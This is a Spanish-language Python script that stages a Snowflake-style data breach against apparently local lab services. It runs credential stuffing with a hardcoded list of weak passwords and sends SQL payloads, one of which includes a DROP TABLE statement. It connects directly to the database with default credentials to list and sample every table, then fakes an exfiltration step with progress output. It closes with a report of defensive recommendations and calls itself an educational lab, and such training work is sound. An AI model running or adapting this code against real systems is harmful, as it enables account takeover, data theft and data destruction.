#!/usr/bin/env python3
"""
Simulador de ataque a plataforma Snowflake - Versión Completa
"""
import requests
import time
import psycopg2
import json
import sys
from datetime import datetime

class SnowflakeAttackSimulator:
    def __init__(self, target_app="http://vulnerable-app:8080", target_db="snowflake-db"):
        self.target_app = target_app
        self.target_db = target_db
        self.session_cookies = None
        self.stolen_data = []
        
    def wait_for_service(self, timeout=30):
        """Espera a que el servicio esté disponible"""
        print("[*] Esperando que los servicios estén listos...")
        start_time = time.time()
        while time.time() - start_time < timeout:
            try:
                response = requests.get(f"{self.target_app}/login", timeout=2)
                if response.status_code == 405:  # Method Not Allowed (pero el endpoint existe)
                    print("[+] Servicio de aplicación listo")
                    return True
            except:
                pass
            time.sleep(2)
        print("[-] Timeout esperando servicios")
        return False
    
    def credential_stuffing(self):
        """Simula ataque de credential stuffing"""
        print("[*] Iniciando credential stuffing...")
        
        credentials = [
            {'username': 'admin', 'password': 'Admin123'},
            {'username': 'admin', 'password': 'admin123'},
            {'username': 'administrator', 'password': 'Admin123'},
            {'username': 'sysadmin', 'password': 'Snowflake2024!'},
        ]
        
        for creds in credentials:
            try:
                print(f"[*] Probando: {creds['username']}:{creds['password']}")
                response = requests.post(
                    f"{self.target_app}/login",
                    json=creds,
                    timeout=5
                )
                
                if response.status_code == 200:
                    print(f"[+] Credenciales válidas encontradas: {creds}")
                    self.session_cookies = response.cookies
                    return True
            except Exception as e:
                continue
        
        print("[-] No se encontraron credenciales válidas")
        return False
    
    def test_sql_injection(self):
        """Prueba vulnerabilidades de SQL Injection"""
        print("\n[*] Probando SQL Injection...")
        
        if not self.session_cookies:
            print("[-] Necesitas autenticarte primero")
            return False
        
        payloads = [
            "SELECT * FROM customer_data",
            "SELECT * FROM customer_data WHERE name LIKE '%'",
            "SELECT * FROM customer_data; DROP TABLE test;--",
        ]
        
        for payload in payloads:
            try:
                response = requests.post(
                    f"{self.target_app}/query",
                    json={'query': payload},
                    cookies=self.session_cookies,
                    timeout=5
                )
                
                if response.status_code == 200:
                    data = response.json()
                    if 'results' in data:
                        print(f"[+] SQL Injection exitoso con: {payload[:50]}...")
                        print(f"[+] Datos obtenidos: {len(data['results'])} registros")
                        return True
            except Exception as e:
                print(f"[-] Error con payload: {e}")
                continue
        
        return False
    
    def access_sensitive_data(self):
        """Accede a datos sensibles"""
        print("\n[*] Accediendo a datos sensibles...")
        
        if not self.session_cookies:
            print("[-] Necesitas autenticarte primero")
            return False
        
        try:
            response = requests.get(
                f"{self.target_app}/data",
                cookies=self.session_cookies,
                timeout=5
            )
            
            if response.status_code == 200:
                data = response.json()
                print(f"[+] Acceso a datos exitoso")
                print(f"[+] Total de registros accedidos: {data.get('count', 0)}")
                
                if 'data' in data and len(data['data']) > 0:
                    print("\n[+] Muestra de datos robados:")
                    for i, row in enumerate(data['data'][:3]):
                        print(f"    Registro {i+1}: {row}")
                    return True
            else:
                print(f"[-] Error accediendo datos: {response.status_code}")
                
        except Exception as e:
            print(f"[-] Error: {e}")
        
        return False
    
    def direct_db_access(self):
        """Intenta acceso directo a la base de datos"""
        print("\n[*] Intentando acceso directo a la base de datos...")
        
        try:
            conn = psycopg2.connect(
                host=self.target_db,
                database="snowflake_sim",
                user="admin",
                password="Admin123",
                port=5432
            )
            
            cur = conn.cursor()
            
            # Listar tablas
            cur.execute("""
                SELECT table_name 
                FROM information_schema.tables 
                WHERE table_schema = 'public'
            """)
            
            tables = cur.fetchall()
            print(f"[+] Conexión a DB exitosa")
            print(f"[+] Tablas encontradas: {len(tables)}")
            
            for table in tables:
                table_name = table[0]
                try:
                    cur.execute(f"SELECT COUNT(*) FROM {table_name}")
                    count = cur.fetchone()[0]
                    print(f"  - Tabla: {table_name} ({count} registros)")
                    
                    # Obtener muestra de datos
                    cur.execute(f"SELECT * FROM {table_name} LIMIT 2")
                    sample = cur.fetchall()
                    
                    self.stolen_data.append({
                        'table': table_name,
                        'count': count,
                        'sample': sample
                    })
                    
                except Exception as e:
                    print(f"  [!] Error en tabla {table_name}: {e}")
            
            cur.close()
            conn.close()
            return True
            
        except Exception as e:
            print(f"[-] Error conectando a DB: {e}")
            return False
    
    def simulate_data_exfiltration(self):
        """Simula exfiltración masiva de datos"""
        print("\n[*] Simulando exfiltración masiva de datos...")
        
        if len(self.stolen_data) == 0:
            print("[-] No hay datos para exfiltrar")
            return False
        
        total_records = sum(item['count'] for item in self.stolen_data)
        
        print(f"[+] Iniciando exfiltración de {total_records} registros...")
        print("[+] Simulando transferencia de datos...")
        
        # Simular transferencia
        for i in range(5):
            time.sleep(0.5)
            progress = (i + 1) * 20
            print(f"[+] Progreso: {progress}% - Transfiriendo datos...")
        
        print(f"[+] Exfiltración completada")
        print(f"[+] Total de datos robados: {total_records} registros")
        print(f"[+] Tablas afectadas: {len(self.stolen_data)}")
        
        return True
    
    def generate_attack_report(self):
        """Genera un reporte del ataque"""
        report = {
            "attack_timestamp": datetime.now().isoformat(),
            "target_system": "Snowflake Simulation Platform",
            "attack_scenario": "Mass Data Breach via Credential Compromise",
            "vulnerabilities_exploited": [
                "Missing MFA (Multi-Factor Authentication)",
                "Default/Weak Credentials",
                "SQL Injection Vulnerability",
                "Excessive Database Permissions"
            ],
            "attack_steps": [
                "1. Credential stuffing attack successful",
                "2. Session hijacking via stolen cookies",
                "3. SQL injection to extract database schema",
                "4. Direct database access with compromised credentials",
                "5. Mass data exfiltration"
            ],
            "data_compromised": {
                "total_tables": len(self.stolen_data),
                "total_records": sum(item['count'] for item in self.stolen_data),
                "tables_accessed": [item['table'] for item in self.stolen_data]
            },
            "recommendations": [
                "Implement MFA for all user accounts",
                "Enforce strong password policies",
                "Implement SQL input validation and parameterized queries",
                "Restrict database access to only necessary IPs",
                "Implement network segmentation",
                "Enable logging and monitoring for suspicious activities"
            ],
            "simulation_notes": "This is an educational simulation of the Snowflake data breach incident"
        }
        
        # Guardar reporte localmente
        try:
            with open('/scripts/attack_report.json', 'w') as f:
                json.dump(report, f, indent=2)
            print(f"\n[+] Reporte de ataque guardado en: /scripts/attack_report.json")
        except Exception as e:
            print(f"[-] Error guardando reporte: {e}")
        
        return report
    
    def run_complete_attack(self):
        """Ejecuta el ataque completo"""
        print("="*70)
        print("SIMULACIÓN DE FILTRACIÓN MASIVA DE DATOS - CASO SNOWFLAKE")
        print("="*70)
        
        # Esperar a que los servicios estén listos
        if not self.wait_for_service():
            return
        
        time.sleep(2)
        
        print("\n[FASE 1] - EXPLOTACIÓN DE CREDENCIALES (Sin MFA)")
        print("-" * 50)
        if not self.credential_stuffing():
            print("[-] Ataque detenido en Fase 1")
            return
        
        print("\n[FASE 2] - INYECCIÓN SQL Y ACCESO A DATOS")
        print("-" * 50)
        self.test_sql_injection()
        self.access_sensitive_data()
        
        print("\n[FASE 3] - ACCESO DIRECTO A BASE DE DATOS")
        print("-" * 50)
        self.direct_db_access()
        
        print("\n[FASE 4] - EXFILTRACIÓN MASIVA DE DATOS")
        print("-" * 50)
        self.simulate_data_exfiltration()
        
        print("\n[FASE 5] - GENERACIÓN DE REPORTE")
        print("-" * 50)
        self.generate_attack_report()
        
        print("\n" + "="*70)
        print("RESUMEN DEL ATAQUE")
        print("="*70)
        print("✓ Credenciales comprometidas: admin:Admin123")
        print("✓ Autenticación sin MFA: EXPLOTADA")
        print("✓ SQL Injection: POSIBLE")
        print("✓ Acceso directo a DB: EXITOSO")
        print("✓ Exfiltración de datos: SIMULADA")
        print(f"✓ Total tablas comprometidas: {len(self.stolen_data)}")
        print("="*70)
        print("\n[+] Simulación completada exitosamente")
        print("[+] Este laboratorio educativo demuestra la importancia de:")
        print("    - Implementar MFA obligatorio")
        print("    - Usar credenciales fuertes")
        print("    - Validar entradas SQL")
        print("    - Segmentar y monitorear accesos a datos sensibles")

if __name__ == "__main__":
    try:
        simulator = SnowflakeAttackSimulator()
        simulator.run_complete_attack()
    except KeyboardInterrupt:
        print("\n[-] Ataque interrumpido por el usuario")
        sys.exit(0)
    except Exception as e:
        print(f"\n[-] Error crítico: {e}")
        sys.exit(1)
